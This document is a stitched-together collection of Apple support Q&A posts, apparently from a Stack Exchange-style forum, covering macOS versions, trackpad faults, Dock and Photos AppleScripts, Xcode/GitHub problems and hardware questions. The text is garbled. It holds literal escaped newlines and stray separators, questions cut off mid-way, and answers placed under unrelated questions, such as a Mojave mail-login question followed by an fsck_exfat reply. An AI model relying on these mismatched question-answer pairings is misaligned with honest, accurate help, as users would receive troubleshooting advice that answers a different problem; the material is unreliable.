Just got a 2019 iMac, shipped with Mojave installed obviously. It never even occurred to me that it may not be able to run an earlier version of OS X, but after wasting tons of time trying to create a bootable USB installer of High Sierra only to find that the new iMac can't boot off of it, I got off of the phone with Apple Support who basically informed me that there's nothing that can be done to get this 2019 machine running an earlier version of OS X. Virtually none of the software I use for work is supported on Mojave yet. Is there ANY way that this machine can run High Sierra? Is it physically possible?\n\nA: This is usually the case with new Apple hardware. AirPods version 2 require the latest version of all of Apple's OSs to work. From the fine print at the bottom of Apple's official AirPods page\n\nRequires an iCloud account and macOS 10.14.4, iOS 12.2, or watchOS 5.2.\n\nThis is especially true for new Macs, since the the new hardware requires updated drivers to work. Updating these drivers is non-trivial. Consider the case of Touch ID. That is a whole new subsystem that never existed before and updates to that system (i.e. the T2 chip) also require changes to the OS that Apple does not back-port to older versions of the OS.\nOne way to run an older version of the os is to use a virtual machine on your new iMac. I'm not sure what the state of VMs is currently, but there used to be Parallels and another that could run older versions of macOS in a virtual machine. This is not ideal, but may help.\nApple does have a 14 day return for any reason policy in the US, so you could return it and reconsider your options.\nSorry for the bad news, but this is how Apple keeps pushing things forward.\n\nA: The older versions of macOS will not have the drivers for the still unshipped hardware. That makes it physically not possible to run the older release of macOS natively on the newer hardware.\nYou can however use a virtualization solution to run an older version of macOS as a guest atop of native install.\n", "Q: My MacBook Pro won’t turn on, shows me only the installer log Of course right before a deadline.

There might be an issue with your battery - that you allowed it to discharge completely. If the issue was only temporary, you can try to set time and date in Recovery (Command R). From there, you also have other options like checking your system partition. Then you restart and hopefully all works again.\nAlso, there might be menu options where you get the error where you can choose the start up disk. The same you can do by starting with the ALT/Option key.\nPRAM reset and SMC reset may also help - and then maybe setting the date again in Recovery.\nAdditionally, it looks like something was uninstalled which the computer looks for at startup. If you start into safe boot (Shift), the computer may start and you can try to undo what you did, or cleanup the remains of something you deleted. Check the forums for launchagents, cache and such to see what you need to delete. Also check the time and date on your computer while at it.\nIf the issue is caused by a full hard disk (the reinstall error points to that), delete some unneeded files - cache, downloads and so on, to get enough space. Easiest done by starting from an external disk. If you don't have such a backup-OS, get yourself an empty disk, connect it, start in recovery, and install OS X on it. Then you can start from there and use Finder to make more room on your main disk. That might already resolve the issue.\nIf that fails, you can now also reinstall the operating system, as you can free enough space on the disk. Before you do that, if you don't have a backup, save the content of your hard disk by copying all the needed data from the system disk. I suggest installing the same version you already have on the system disk, or a newer version. This is easiest from the Recovery mentioned earlier. However, this will not fix all such issues - you might still get the error.\nIf you do, you have to delete your system disk (never without at least two backups on different disks you are sure to be fine), install the system anew, and restore the last functioning backup or just your data and reinstall your apps.\nEdit: There might also be a hardware issue - for instance if you can't access your disk even in Internet Recovery. In that case, you will need a repair before you can use the computer...\n", "Q: In iTunes, when you purchase a movie in HD/4K, is the SD copy included?

The iTunes store on iOS 6 doesn't work anymore for viewing movie pages, so I have to try and download the SD version of the movie on iTunes and sync it over.\n\nA: According to Apple's site about downloading or streaming movies:\n\nAfter you buy a movie or TV show from the iTunes Store, you can stream it on the device that you bought it on or on any of your other devices, as long as you're signed in with the same Apple ID.\nVideos stream and download at the highest-quality version available based on the device that you're using, your device's settings, and your Internet speed.\nThe SD version won’t have iTunes Extras, 4K, HDR, Dolby Vision, or Dolby Atmos formats, even if you play it later on a device that supports those features and formats.\n\nAccording to that, I would say it will stream to your older device but the SD version is not automatically downloaded along with the HD version.\n", "Q: Mojave 10.14.4 update causes mail passwords not to work After 10.14.4 my hotmail and ntlworld mail accounts will not login.

The mac reboots.\nIs this a known issue? I could not find anything googling. Do you have a workaround for it?\n\nA: This is not a problem with the drive. Newly-formatted drives get the same fsck_exfat error. It is a problem with fsck_exfat on versions of Mac OS X newer than Snow Leopard.\nAs man fsck_exfat says:\n\nThe fsck_exfat utility first appeared in Mac OS X 10.6.3.\n\nI don't know how you can bypass the required automatic fsck in macos 10.14.4. It is fsck_exfat -q <disk> that quickly checks to see if the volume was \"cleanly unmounted\". Perhaps that is being automatically run.

I don't think there are default shortcuts for that. But I assume you could make one using AppleScript or other automation programs. \nI found this post from 2012 asking the same question. I tried making the script provided in the comments but couldn't make it work. \nI'm not sure if it isn't working because Apple Scripts are different now, or because the script per se doesn't work or because there are steps I'm skipping. \nWhen I try to save the script it says \n\n“Expected “given”, “with”, “without”, other parameter name, etc. but found identifier.”\n\nAny idea?\n\nA: The reason you get the Syntax Error:\n\nExpected “given”, “with”, “without”, other parameter name, etc. but found identifier.\n\nFrom:\ndefaults write com.apple.Dock orientation -string left;killall Dock\n\nIn Script Editor is because it is not AppleScript code!\nIt's a compound command to run in Terminal; however, it can be run in AppleScript by using the do shell script command:\ndo shell script \"defaults write com.apple.Dock orientation -string left;killall Dock\"\n\nThat said though, I'd choose not to use it because the result of killall Dock with unhide all hidden windows and can be very disruptive and messy.\nAn alternative is to use UI Scripting1 with System Preferences, and this can be done in a less disruptive manner then killall Dock. 1Note that using UI Scripting may require accessibility privileges be granted.\nThe following example AppleScript code will toggle the position of the Dock between the Bottom and the Left side of the screen:\nThis was tested in Script Editor and works under macOS High Sierra.\nif running of application \"System Preferences\" then\n    try\n        tell application \"System Preferences\" to quit\n    on error\n        do shell script \"killall 'System Preferences'\"\n    end try\nend if\n\nrepeat while running of application \"System Preferences\" is true\n    delay 0.01\nend repeat\n\ntell application \"System Preferences\" to ¬\n    reveal anchor \"Main\" of pane id \"com.apple.preference.dock\"\n\ntell application \"System Events\" to tell application process \"System Preferences\"\n    repeat while not (exists (window \"Dock\"))\n        delay 0.1\n    end repeat\n    tell radio group 1 of window \"Dock\"\n        if value of radio button \"Bottom\" is 1 then\n            click radio button \"Left\"\n        else if value of radio button \"Left\" is 1 then\n            click radio button \"Bottom\"\n        end if\n    end tell\nend tell\n\nquit application \"System Preferences\"\n\n\nThis example AppleScript code can be used in an Automator Service (Quick Action in macOS Mojave) using a Run AppleScript action, and assigned a keyboard shortcut in: System Preferences > Keyboard > Shortcuts > Services\n\nNote: The example AppleScript code is just that and does not contain any error handling as may be appropriate. The onus is upon the user to add any error handling as may be appropriate, needed or wanted. Have a look at the try statement and error statement in the AppleScript Language Guide.

I completely copied the iMovie Library folder from the first machine to the second.  When I opened iMovie on the new machine it showed some progress in recognizing the new library, and then opened my project.  At first, everything looked fine, but then I noticed that some of the sound clips had no sound in them.  I see the green rectangle for the correct duration, but there is no waveform displayed in it, and when I play it there is no sound. When I reveal the source the original clip there is no sound there either.\nIt seems like roughly half of the sound is missing.  But the thing is, it's all from the same source file.  I compared the imported media file and it's identical to the original.   Furthermore, the sound is present in the actual media file.  I tried deleting the extra directories in the event directory (Analysis Files, CurrentVersion.imovieevent, and Render Files) and it was able to \"repair\" the event, but the sound is still missing.\nHow can I get my sound back?!\nEdit: I enabled viewing the waveform in the event viewer, and it appears that the sound abruptly ends at 54.7 minutes.\n\nA: Updating to iMovie version 10.1.11 (on the second machine, to which the project was transferred) fixed the issue for me.\n", "Q: iPhone SE bought on eBay no longer working I bought an unlocked iPhone SE on eBay Germany six months ago with no Apple guarantee but a 2 year Apple Agent guarantee. Here's what the offer said:\nNo Apple Garantie.\n2 Jahr garantie vom Apple-Agent. \n\nThe iPhone is falling apart (the screen is popping out of the frame).  I have contacted Apple and did a warranty check and the iPhone is not under warranty.\nI have the receipt and wonder why the warranty is not valid?\n\nA: This should be easy to clear up. \nApple serializes products and the warranty starts when the device is first sold. Since you are in possession of a device, register the device to your Apple ID with Apple and then ask Apple when was the original sold date.\nIf the listing says an apple agent warrantee is in place, I would take the device to any Apple agent you choose and get in writing that they’ve denied you warranty service.\nNow you have a paper trail to take to eBay if the listing was falsified. If the listing wasn’t falsified then you bought something without the knowledge the seller had. Unfortunately this is a “feature” of many “markets” when the seller has more information than the buyer. \nSince eBay is the market here, hopefully the market will compensate you if in fact the seller took illegal advantage of the marketplace rules. Or they will educate you in how their market operates and then you decide if you want to pay for out of warranty repairs. \nIf the seller observed the rules, there is a saying for this - https://en.wikipedia.org/wiki/Caveat_emptor\n", "Q: SIM card transferrable between iPhone models?

I'm assuming it's unlocked as he used it before his death.\n\nA: Yes. If you are not using a carrier locked iPhone and using a standard SIM card, it can be easily transferred from one iPhone to another.\nHowever, newer iPhones support cellular and connectivity technologies which may not be available on older models. For e.g. iPhone 5s and earlier lack support for 4G networking.

Whenever I tried to open the game, I always received the same error message:\nThe last time you opened Enter the Gungeon, it unexpectedly quit while reopening windows. Do you want to try to reopen its windows again?\nIt doesn't matter which option I choose, the program always crashes. Whenever I open the game on any other user, it works. I have tried messing with the .plist file of the game, restarting my computer, updating my OS, and reinstalling the game (even with updated versions). I have a MacBook Air (13-inch, 2017), and I am one macOS Mojave (version 10.14). I have 8 GB of RAM.\nWhat could be done to fix this error?\n\nA: You might try deleting any Saved Application State for the app.\nYou might need to scroll through to find the correct one, as they tend to be named with the convention com.companyname.productname\nFrom the Finder, hit  Cmd ⌘   Shift ⇧   G  for Go to Folder... & copy/paste ~/Library/Saved Application State/\nYou can safely delete the entire com.companyname.productname folder, it will be recreated at next launch/quit cycle.\n\nA: Deleting EtG saved state worked for me to stop the \"unexpectedly quit while reopening windows\" message of showing, but the game kept crashing on startup.\nAnyway I was able to fix it by deleting the game's cache. I used the instructions on this post of how to fully uninstall the game: https://macutility.com/Games/uninstall-Enter-the-Gungeon-58523.html to succesfully delete the game's cache by accesing the folder \"Preferences\" located on the folder \"Library\".

You’ll need macOS High Sierra it later to run Xcode 10.1.\nSince your model of MacBook Pro supports running macOS High Sierra, it's recommended that you upgrade to it. You can install current latest version of Xcode 10.2 in macOS High Sierra 10.13.6.\n\nA: If you can’t update your OS then the only other solution I can think of would be to create a virtual machine, install Mojave and Xcode 10 in it, and do all of your development within the virtual machine.

That is a cosmetic issue with the LCD panel. Without a physical inspection or examining the panel, my best guess is the layers are compressed physically.

If Apple wants to cover it under warranty, r dilemma is solved so definitely get a quote for repair. \nAs to the coming and going, If you carry your Mac in the book bag or it could be getting otherwise squeezed, that would explain why the color moves around in the dissipates as the glass and plastic layers reset themselves.

After the update was installed and I logged in I immediately noticed that trackpad does not work at all\nAs apple support suggested through their chat I've done the following without any success:\n1. Restarted my macbook\n2. Attempted to reset SMC by holding Shift+Control+Option+Power button.\n3. Attempted to reset NVRAM by holding Command+Option+P+R. While holding these keys my macbook would turn on the screen for a couple of seconds (just a black screen, no logo) and then it would turn off entirely for about 10 seconds, then again lit-up black screen for a couple of seconds and so on. So I suspect I was never able to actually reset NVRAM successfully\n4. Launched my macbook in the safe mode by holding Shift and then restarted it in regular mode.\n5. Launched diagnostics mode by holding \"D\". It said that all hardware is fine.\n6. Launched recovery mode by holding Command+R and then performed an HDD check. It didn't find anything that needed fixing.\n7. Then again in recovery mode I reinstalled Mac OS. This did not help with the dead trackpad either.\nSo at this point I guess the only thing I wasn't able to do is to reset NVRAM properly and maybe there are other options to reset it other than to hold Command+Option+P+R. Or maybe there's some boot log somewhere that would indicate what went wrong while I was holding these keys and macbook failed to boot.\nThe next step I am considering is to factory reset this macbook. Will this help somehow or is it essentially the same as reinstalling Mac OS from recovery mode that I already did (without disk erraising).\nI guess the last option is to consider that it is a hardware problem but if it is the case it seems kinda odd that trackpad stopped working right after I've installed the update.\n\nA: I’m currently faced with this problem.

Is it possible to view/dump metadata found in images using Terminal with built-in command line tools? I'm looking for something like exiftool, but native to macOS Mojave. Does such a command/tool exist?\n\nA: The metadata in the filesystem is exposed from mdls but I don’t recall ever seeing exit data being parsed as that is embedded in the binary portion of the file and not stored as filesystem metadata on APFS or HFS.\nGo get exif tool as a stand alone download https://www.sno.phy.queensu.ca/~phil/exiftool/ or you can use https://brew.sh to get exiftool and script extracting the data you want, subsequently saving it as metadata for mdls or spotlight.\nThere might be a (un)documented way to parse the database files within Photos, but since those are private, I expect they change from version to version or are going to be some work to extract.

The trackpad is not completely unresponsive, but instead gets stuck in 2 finger scrolling mode. What I mean by this is that the trackpad still works, but I am unable to use the pointer when it gets stuck in this mode. I am still able to scroll up and down on webpages etc, but the pointer is stuck. What happens is suddenly i am able to scroll with one finger instead of 2. The problem seems to be only initiated by using the 2 finger scrolling gesture. \nMy current workaround is to ALT-TAB to another program and this sometimes solves the issue, but not always. I have tried to search the internet about this but have come up empty handed. Hoping someone can guide me in the right direction. \nTo be clear, the trackpad is one of those that has only one large button (no left and right buttons). \nThanks\n\nA: Sometimes issues like these can happen if there is water underneath the trackpad. Try blowing some air or warming it out in the sun or other dry area. \nTry to use an external mouse and you should know if the USB bus is still working.\nYou can refer to iFixit to open your MBP and remove the small dust particles which maybe cause the issue or try to reinstall OS X and see if that fixes the issue.\nThere are mouse controls via keyboard if you need to get around or avoid a repair. \n\n\n*\n\n*https://support.apple.com/en-us/HT204434\n", "Q: How to stop OneDrive from autostarting When I boot up my Mac there is a OneDrive icon in the menu bar.

Simply move your mouse between your computers effortlessly. You can even copy and paste between computers. Synergy works on Windows, macOS, Linux, and Raspberry Pi. You only need a regular Ethernet or WiFi network connection, and no special hardware. It works like magic. \n\nOther research like  Mouseshare, Synergy , symless.com all of these softwares just need to a network and I don't think they work with wireless.\nI don't get why my WiFi isn't working with this solution and I think it needs to \"cable network\" that i don't have. Can someone confirm this setup works or how I would know why my WiFi isn't working for this case?\n\nA: If I were trying to do what I think you're trying to do I would use Microsoft's Remote Desktop. It's available for macos from the App Store via this link. It's also free (as in zero cost), so you've only a bit of time to lose for trying it. \nI've used it for years, and found it works quite well for my purposes.

I had the chance to have in my hands an old mac mini from 2009. I turned it on, it works perfectly. Currently it runs Mac OS X 10.6.8.\nNow, I would like to try to upgrade it to a slightly newer version, like El Capitan.\nSo, I created a brand new AppleID on https://appleid.apple.com with all my data, including a valid credit card. I checked and Apple did registered and then deleted a transaction with a small amount, to check the credit card. I also confirmed my email using the code Apple sent me during the AppleID registration phase.\nAfter that I opened the \"App Store\" app on this old Mac, I navigated to the page where I can download El Capitan from, and a pop up asks me to input my AppleID credentials. \nI've done it and a pop up tells me that my AppleID have not yet been used in the app store and that I have to verify it.\nI click on \"verify\" and a second pop up tells me I have to update the software and the OS to be able to verify my AppleID.\nSo I'm now stuck in this catch 22 situation.\nCan someone explain me if there's a way to solve it?\nCheers.\n\nA: here's how I fixed that situation.\n\n\n*\n\n*I downloaded Apple Music on my Android phone.\n\n*I start the procedure to subscribe to the service with my existing AppleID.\n\n*As it happened in my old Mac Mini, Apple Music on Android opened a popup saying my AppleID had not yet been verified.\n\n*On Android, however, in contrast with the Mac Mini, the verification link worked.\n\n*I had to retype the details of my credit card that I had already provided when I created the AppleID for the first time.\n\n*The verification process completed successfully, Apple debited my credit card for the second time, cancelling the payment after a while.\n\n*After that, I accessed the Apple Store from the old Mini Mac with the AppleID I had just verified on Android and...\n\n*It worked flawlessly. I downloaded OS X El Capitan and completed the upgrade successfully.\n\n\nI write this procedure in case someone else will get stuck in the same, even highly unlikely, situation.  \n", "Q: Can I use one 8GB RAM module in place of two 4GB modules? I have a MacBook Pro 13-inch, Mid 2012 and one of its RAM slots appears to have been damaged (The computer restarts when moved too much). So I can only have one RAM module in it. I was reading on Apple's website for changing RAM: https://support.apple.com/en-us/HT201165#1.\nThey state that my computer is only able to have a maximum of 8GB RAM.\nMy question is, can I have a single RAM module with 8GB instead of 2x 4GB RAM modules as they mention on the website?\n\nA: For the MacBook Pro 13-inch, Mid 2012, Apple only officially supports 8 GB RAM, 2 - 204-pin PC3-12800 (1600 MHz) DDR3 SO-DIMM; however, it can actually support 16 GB.

I am trying to get my app into testflight for testing with \"external\" beta testers.  The app is nowhere near complete, it is totally non-functional, and is intended as a starting point for my team to discuss UI elements.\nIs my app ineligible for test flight until it constitutes a certain level of \"completeness\" by Apple's standards?  Does anyone know what those standards are?  Do they differ from the requirements of completeness for an app on the store?\n\nA: This information is detailed by Apple on their Testflight page.\n\nWhen you add the first build of your app to a group, the build gets\n  sent to beta app review to make sure it follows the App Store Review\n  Guidelines. This is the only beta version of your app that requires a\n  full review, and testing can begin once it’s approved.\n\nDrilling down into the App Store Review Guidelines under Beta Testing, there is this statement:\n\nAny app submitted for beta distribution via TestFlight should be\n  intended for public distribution and should comply with the App Review\n  Guidelines.\n\nBottom Line: Your Beta app is going to get reviewed once, and the expectation is that it's \"ready\" for distribution.  An app that doesn't function is, by definition, not ready for distribution.\nYou will have to use an alternate distribution method if you want to get out incomplete - totally non-functional builds.\nGet devices and load them from Xcode and ship them out or have people ship you their devices is the next best method if you don’t want to use a wireframe / mock up tool to get past the initial design phase and you have a minimum viable product to share with Apple for Apple hosting and distribution to your test group.\n", "Q: How to connect Surface Pro 6 to Apple Thunderbolt Display 27\" I want to connect a Surface Pro 6 to an Apple Thunderbolt Display 27\".\nWhat do I need to do to transfer display signals to the Apple Display?\n\nA: Unfortunately, you can't connect Surface Pro to Apple Thunderbolt Display as @jksoegaard suggested because Thunderbolt Display can be connected to thunderbolt port only. Trust me, I have both, I've tried, it's not working and it makes sense it doesn't. When Surface Pro comes equipped with thunderbolt port instead of miniDisplay Port, it should be possible, but right now, it is not.\n\nA: You just need to plugin the monitor to the Surface Pro 6.\nThe monitor comes with with a combination cable of both Thunderbolt (i.e. mini-DisplayPort connector) and MagSafe for charging. Just take the Thunderbolt-cable and plug it straight into the Surface Pro 6.\nThe Surface Pro 6 has a mini-DisplayPort for display output, and it is compatible with the Thunderbolt cable from the monitor for transferring the display signal. Note that you will not get other features working over this cable such as speakers or camera.\n", "Q: Can’t get \"play/pause\" of window 1.

I’d guess OnyX didn’t help, but we’ll need to wait to get it to recur to know for sure.\nAlso, that directory is where the unified logs are stored, so you could also just inspect your normal logs in console app - if you have a high volume of logs, then your growth is normal and you’d uninstall / fix / suppress whatever is generating all the volume in the logging system.\nlog stream --info --debug\n\nAlso, most people are stunned and shocked to see how many thousands of info and debug messages get logged each and every second on a perfectly healthy mac, so don’t worry if you feel the volume is high without comparing to other computers.

Or a browser extension that blurs the specific part of the screen (again) while surfing the Internet?\n\nA: Not exactly blurring but you can use the following app to create a floating \"snap\" that can be used to conceal part of screen.\nSnappy - Snapshots, the smart way is a free app that you can download from the Mac App Store.\nSnappy lets take create snapshot of a part of screen or entire window which remains floating on top of all other windows. You can use it to create a blank snapshot, (such as one of blank portion of screen or part of wallpaper). This snap can be moved around or freely resized. It is possible to adjust the alpha value for the snap using the context menu. It doesn't actually create a blurred view but you may find that useful.\nAlso, it takes a simple mouse click to get rid of the snap. Snappy app runs in Menu bar, and keeps track of all the previously captured snaps (which can be re-invoked using a simple click).\nA sample is as shown below:\n\nHere I have created a snap of the white portion of the browser viewport and resized it to conceal the part showing the question.\n\nNote: No affiliation whatsoever to the developer.I find this app super useful in my workflow, where I need to keep around snap of some part of the screen.\n", "Q: How to disable shift + quotation mark vowel diaeresis (äëöïÿ) I'm using an external US International keyboard.\nWhen pressing the quotation mark button, together with Shift (⇧ + \") some special mode enables.\nWhen I type a vowel, the following comes out: ä ë ö ï ÿ\nThis is not my desired output, I wish for \"a\".\nWikipedia told me this is named Diaeresis:\n\nDiaeresis\n  diacritic\n  The diaeresis, also spelled diæresis or dieresis and also known as the tréma or the umlaut, is a diacritical mark that consists of two dots placed over a letter, usually a vowel. When that letter is an i or a j, the diacritic replaces the tittle: ï.  \n\nBut several internet searches have not yielded any results in how to change this behavior. \nHow can I change this behavior? \n\nA: What you describe is standard behavior for the \"US International PC\" input source.  It is intended for Windows users who are familiar with it from that system.  4 keys (` ' \" ^) become dead keys for making accented characters used in common European languages.\nThe fix is to go to system preferences/keyboard/input sources and remove this item and instead use input sources named \"US\" or \"ABC\" or \"British\".\nThe hardware keyboard called \"English International\" is the ISO version of Apple's English keyboard. It is used mainly in Europe and has an extra key next to the Z and a differently-shaped return key compared to the ANSI version sold in the US.  It does not require any special input source, all of them work for both ISO and ANSI hardware versions.\n\nA: An answer borrowing on two colleagues, so the question can be closed:\n1) check exactly what keyboard you have and make sure it is using the correct input source\n2) has a key combination been set to trigger that behavior?\nYou may find this link useful:\nhttps://support.apple.com/en-us/HT201794\n", "Q: iTunes: The song could not be used because the original file could not be found.

In this comparison the main difference I see is in the processors.\nhttps://www.apple.com/in/mac/compare/results/?product1=imac-21&product2=mac-mini\nIrrespective of other feature differences this is what I'm mainly concerned about.\nOn the iMac it is 2.3GHz dual-core Intel Core i5 processor\nOn the Mac mini 3.6GHz quad-core Intel Core i3\nCan someone help me to identify which is better in terms of performance?\n\n\nA: The iMac in your screenshot comes with the Intel i5-7360U CPU. The Mac Mini comes with the i3-8100B CPU.\nIf you look at the PassMark benchmark, the i5-7360U CPU benchmarks at 5823 passmarks multi-threaded and 2047 single-threaded. If you look at the Geekbench benchmark, the i5-7360 CPU benchmarks approx. 9075 multi-threaded and 4375 single-threaded.\nIn comparison the i3-8100B CPU benchmarks at 8431 passmarks multi-threaded and 2172 passmarked single-threaded. For Geekbench the numbers are approx. 14.000 multi-threaded and 4700 single-threaded.\nThere could be an obscure corner case, but I would expect the Mac Mini to have the best CPU performance in almost any case. According to the benchmarks, you would expect it to be approx. 40-50% faster, when running a multi-threaded workload (i.e. running more than one app at the same time, or running an app that is multi-threaded in itself). Note that this number may vary wildly depending on what exactly you're doing with it. As the i3-8100B is a newer generation and has a higher frequency memory bus, I would expect there to be almost no corner cases, if any at all.\n", "Q: ssh fails with ssh_dispatch_run_fatal invalid format During the last years I've had various problems with MacOS SSH, but those were quickly resolved searching the net.

A year ago, I downloaded the Garageband app to my iPhone 6S for the sole purpose of exporting a custom ringtone. I followed the instructions listed on Apple's website and then deleted GarageBand, as I no longer needed it.\nI now would like to delete this ringtone. Apple's instructions say this can be done within Garageband, but after redownloading Garageband and following the instructions, I am told I have no previously-exported ringtones!\nI assume this is because I previously deleted Garageband? Something else? How can I delete this ringtone?\n\nA: FWIW I created a test ringtone using GarageBand on iOS 12.2 using the directions linked in your post.\nI then use iExplore to delete the file under Media > Purchases where there were three files on my device at that location, a Ringtones.plist file that had information about the .m4r file which had a GarageBand icon and a com.apple.ToneLibrary.lock file which was zero bytes in size.\nSince this was the only file I've created with GarageBand and was indeed the file I created and was the only one in the Ringtones.plist file, I deleted both, leaving the com.apple.ToneLibrary.lock file, and then checked the iPhone and the ringtone was no longer available to be selected in Contacts or System Preferences in iOS.\n\nNote: I am not affiliated with the developer of iExplore, Macroplant, simply a user of the product.\nThis was also done with just downloading and installing iExplore without purchasing it, as I currently do not need the paid functions.\n", "Q: MacOs Numbers and tricks with braces Has anybody played around with using braces in a formula?

Instead you use a semicolon like so:\n=ROWS({FALSE,4;TRUE,5;TRUE,6})\n=COLUMNS({FALSE,4;TRUE,5;TRUE,6})\n=VLOOKUP(TRUE,{FALSE,4;TRUE,5;TRUE,6},2,0)\n\nThe first statement produces 3, because the semicolons signify a new row. The second statement produces 2, because there are two comma-separated elements between each semicolon and commas signify a new column. And finally the VLOOKUP produces 5, the value of the element in the second column of the second row which is returned by VLOOKUP.\nEt voilà!\n\nA: Those braces contain an array of items to be tested, you can just as well reference a range of cells containing the same items to be tested.\nThe braces work with many functions and they also work in Excel...\nNote, your match produces \"2\" as the result as that is the position of the first matching result, not the count of the number of \"true\"...\nIf you try:\n=match(true,{true,false,true},0)\n\nthen the result is 1 (for both Numbers and Excel).\n", "Q: Safari won't play Amazon Prime Video on my iMac?

I made the mistake of importing my photo archive for over 11 years which I had organized by year and then by dated events from years of manual collecting with maybe 10-20 folders of photo \"albums\" per year. After importing where it \"preserves\" folder hierarchy to create Albums, I have two problems now.\nFirst off, the way Photos makes albums from an import is beyond stupid as it creates this unnecessary level of folder nesting for each album so that every sub folder which contains just pictures gets converted to a folder level as named and then a single album of the same name! You'd think the last level of photos would be just albums, but no. I can't see how this is at all helpful. I would think all leaves at a folder level would be made an album inside its containing folder so folders would only be created if it contains a sub-folder. This... this is awful. If there was some way to get a \"tree view\" inside the album selection view I could at least manually fix this on a year-by-year basis by moving all albums to their appropriate year,  but this is a no-go in the GUI as far as I can tell.\nThe other problem is that was using Picasa (SHAME!) years ago and I forgot that it pollutes your archive with thumbnails all over the place. I was able to get rid of all of the thumbnail photos using Gemini II which does photo matching (great tool for doing this, by the way) but now I have all of these albums named .@_thumb in every nested album along with each single album of a folders of the same name as I described, compounding the pain. The result is not only visually painful, the extra overhead seems to make Photos a total pig now. Apparently it does NOT like having so many Albums.\nI tried using the command line to see if Album names show up in the Photos Library.photoslibrary hierarchy but either they are not listed there or not named by Album name. Trying find ~/Pictures/Photos\\ Library.photoslibrary/ -name *thumb comes up empty. If I could only access the Albums by some descriptor I could probably fix this with some transformation script but as it stands I don't even know what the data structure is for Albums.\nAny ideas?\n\nA: Launch Script Editor and create a new script.\nDeleting folders named \".@_thumb\"\nCopy and paste the following script into Script Editor.\nuse Photos : application \"Photos\"\n\n\nrun Photos\n\nrecurse(application \"Photos\")\nrepeat with F in flatten(result)\n    try\n        delete F\n    end try\nend repeat\n\n\nto recurse(_X)\n    set _A to a reference to every folder of _X\n    if not (_A exists) then return {}\n    return (_A whose name = \".@_thumb\") & recurse(_A)\nend recurse\n\nto flatten(L)\n    local L\n\n    if L = {} then return {}\n    if L's class ≠ list then return {L}\n    flatten(item 1 of L) & flatten(rest of L)\nend flatten\n\nRun the script (⌘R).\nThe second issue you mentioned is trickier because of a bug in AppleScript that returns an incorrect reference to newly created albums.  At the moment, I'm not sure of a workaround, but I will have a think and update this with any thoughts I glean.\n", "Q: How does macOS process protection work – Cliff Notes style? Looking at Apple dev forums and not having programmed in C since college, I'm a bit out of my depth trying to understand the fundamentals of the components of MacOS' protection model employed over the past few OS releases and how it affects security on the whole.\nI am not sure where Sandboxes came to be in order to protect us from our selves with programs that did naughty things, but I would so appreciate a better understanding of how it works and what happens when said naughtiness occurs.\nI'm guessing the Errors and Faults in Console are related to access and protection issues based on their context and the fact I do run some softs that are not giving the Apple seal of Kwality at software install. I more than likely have processes banging into things or processes failing to access resources. Console I see just streams of Errors and Faults - around 100 per minute on average and they would appear to be rights issues of some sort. The one error I see constantly on of my macs more than any other (usually) is from WindowServer such as:\n_CGXWindowIsOrderedIn: Operation on a window 0xa4 requiring rights <private> by caller <private>\n\n0xa4 appears to be any 2 digit hex number, presumably the address of a window, perhaps?

But despite your best efforts to build an invulnerable barrier—by avoiding buffer overflows and other memory corruptions, preventing exposure of user data, and eliminating other vulnerabilities—your app can be exploited by malicious code. An attacker needs only to find a single hole in your defenses, or in any of the frameworks and libraries that you link against, to gain control of your app’s interactions with the system.\nApp Sandbox is designed to confront this scenario head on by letting you describe your app’s intended interactions with the system. The system then grants your app only the access your app needs to get its job done. If malicious code gains control of a properly sandboxed app, it is left with access to only the files and resources in the app’s sandbox.\n\nWhile the document is marked as not being updated, it remains the best introduction to sandboxing on Apple's platforms.\n", "Q: GitHub account unavailable on Xcode 10.2 I noticed a strange behaviour in my Xcode (v10.2, running on a 2016 MacBook Pro with macOS 10.14.4).

I then create a remote to GitHub via Xcode and commit and push from the source control menu.\nSince yesterday every time I committed I got asked for my username and password. At first I thought it was something normal due to some connectivity issue but then the issue persisted and, going to Xcode Preferences > accounts I noticed that my GitHub account was greyed out and, upon selecting it (or trying to) the right side of the window showed this message:\nAccount Unavailable Your account details could not be loaded because Accountname support is currently unavailable\nAt this point it is impossible to remove my GitHub account from Xcode in order to add it once more and it is also impossible to add any source control account, as if something with version control in general would be very broken.

After updating to Xcode 10.2.1 the \"push to remote\" checkbox was suddenly greyed out with all my projects. I tried several of the solutions I found online, for example deleting and re-adding all the keychain GitHub entries as well as reinstalling Xcode, but nothing worked. \nI believe this is a problem with this version of Xcode and until it is fixed, I found this workaround which allowed me to update my projects on the remote GitHub through the Xcode SourceControl tab as usual.  \nFirst, I removed my existing remote repositories from GitHub and added new empty repositories. Then, I deleted all my local git repositories. Once that was done, I opened terminal and went back into my project's folder and ran the following commands. \n$ git init\n$ git commit -m \"Initial Github Recommit\"\n$ git remote add origin https://github.com/<YOUR_USER_NAME>/<YOUR_PROJECT_NAME>.git \n\nThen, I opened my Xcode project >SourceControl>Commit... and the push to remote checkbox was no longer greyed out and functioned properly. \nThis worked for me and I hope it is helpful to someone.\n\nA: The suggested fixes didn't work for me.

After upgrading to macOS Mojave 10.14, Xcode was no longer updating correctly and my build process was reporting that stdlib.h was missing. Thus, I attempted to uninstall it so I could reinstall it after.\nHowever, after removing it via the (x) button displayed on the Xcode app icon in Launchpad, the app was still in /Applications directory. So I deleted it from there as well.\nHowever, the Mac App Store is still showing the option to update Xcode as if it were installed (and clicking the button resulted in a loading animation being displayed for half a second and then the update button again). I have also removed all the various folder listed here:\n\n\n*\n\n*https://stackoverflow.com/a/53575585/1824538\nas well as followed the instructions to empty the Mac App Store cache provided here:\n\n\n*\n\n*How to fix / Reset App Store app on Mac OSX - El Capitan\nand here:\n\n\n*\n\n*How to remove deleted app from OS X update list?\nSo far, nothing has changed the fact that the Mac App Store thinks I should update instead of install.\nIs there anything else to do to get the Mac App Store to reinstall Xcode?\nIf it's easier, I'd be content with installing LLVM via Homebrew without messing things up. I don't really need Xcode itself, only the build tools. \nxcode-select --install behaves similarly to the Mac App Store (namely claiming the tools are already installed or producing a non-working installation if I remove the CommandLineTools directories in the different Libraries).\nEDIT: after some more back-and-forth I managed to get the Command Line Tools working via xcode-select --install.

